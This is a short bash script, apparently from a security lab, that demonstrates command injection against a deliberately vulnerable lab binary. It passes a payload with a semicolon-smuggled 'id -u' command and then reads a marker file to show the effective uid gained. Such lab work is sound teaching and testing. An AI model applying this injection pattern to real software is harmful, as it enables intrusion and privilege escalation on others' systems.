#!/usr/bin/env bash
set -euo pipefail

SCRIPT_DIR=$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")" && pwd)
ROOT_DIR=$(cd -- "$SCRIPT_DIR/../.." && pwd)
VULN=/usr/local/lib/lab1/lab1_vuln
MARKER=/tmp/lab1_t4_injection.marker
TRACE="$ROOT_DIR/traces/T4-command-injection.log"
PAYLOAD='lab1-demo; /usr/bin/id -u > /tmp/lab1_t4_injection.marker'

mkdir -p "$ROOT_DIR/traces"
exec > >(tee "$TRACE") 2>&1

printf '%s\n' '=== T4: Controlled command injection ==='
sudo rm -f "$MARKER"
sudo -u lab1_alice -- /bin/id
printf 'Command: sudo -u lab1_alice %s shell %q\n' "$VULN" "$PAYLOAD"
sudo -u lab1_alice -- "$VULN" shell "$PAYLOAD"
printf 'Marker content (effective uid reported by injected command): '
sudo /bin/cat "$MARKER"